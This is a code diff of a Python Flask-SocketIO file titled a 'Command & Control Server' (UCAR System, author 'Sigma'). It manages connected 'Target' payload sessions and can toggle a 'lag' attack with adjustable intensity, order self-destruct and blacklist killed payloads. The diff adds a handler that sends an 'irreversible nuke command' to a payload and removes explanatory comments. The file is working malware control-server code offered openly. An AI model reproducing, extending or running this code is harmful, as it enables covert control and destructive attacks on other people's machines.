@@ -1,5 +1,3 @@
-# --- START OF FILE app.py ---
-
 # UCAR System: Command & Control Server
 # Author: Sigma
 
@@ -91,6 +89,19 @@ def delete_session(data):
         del sessions[sid]
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
+@socketio.on('nuke_session', namespace='/dashboard')
+def nuke_session(data):
+    """
+    Handles the 'NUKE' button. Sends the irreversible nuke command to the payload
+    and removes it from the active session list.
+    """
+    sid = data.get('session_id')
+    if sid in sessions:
+        print(f"Server: Issuing NUKE to {sid}")
+        socketio.emit('command_nuke', {}, namespace='/payload', room=sid)
+        del sessions[sid]
+        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
+
 @socketio.on('update_nametag', namespace='/dashboard')
 def update_nametag(data):
     """Updates the display name of a target."""
@@ -107,7 +118,6 @@ def payload_register(data):
     sid = data.get('session_id')
     if not sid: return
     
-    # Check Blacklist (prevent killed payloads from reconnecting)
     if sid in blacklist:
         join_room(sid)
         emit('command_self_destruct', {}, namespace='/payload', room=sid)
@@ -115,24 +125,20 @@ def payload_register(data):
 
     join_room(sid)
     
-    # Initialize session data if new
     if sid not in sessions:
         sessions[sid] = {
             'nametag': f'Target-{sid[:4]}', 
             'status': 'online', 
             'last_seen': time.time(), 
-            'lag_status': 'off',     # Default to OFF
-            'lag_intensity': 5       # Default intensity
+            'lag_status': 'off',
+            'lag_intensity': 5
         }
     else:
-        # If reconnecting, mark online
         sessions[sid]['status'] = 'online'
         sessions[sid]['last_seen'] = time.time()
         
     socketio.emit('session_list_update', sessions, namespace='/dashboard')
     
-    # Sync attack state immediately upon connection
-    # This ensures if the dashboard left the switch 'ON', the payload resumes immediately.
     emit('command_update_lag', {
         'status': sessions[sid]['lag_status'], 
         'intensity': sessions[sid]['lag_intensity']
@@ -148,5 +154,4 @@ def heartbeat(data):
         emit('command_self_destruct', {}, namespace='/payload', room=sid)
 
 if __name__ == '__main__':
-    # Running locally
     socketio.run(app, debug=True, port=5000)
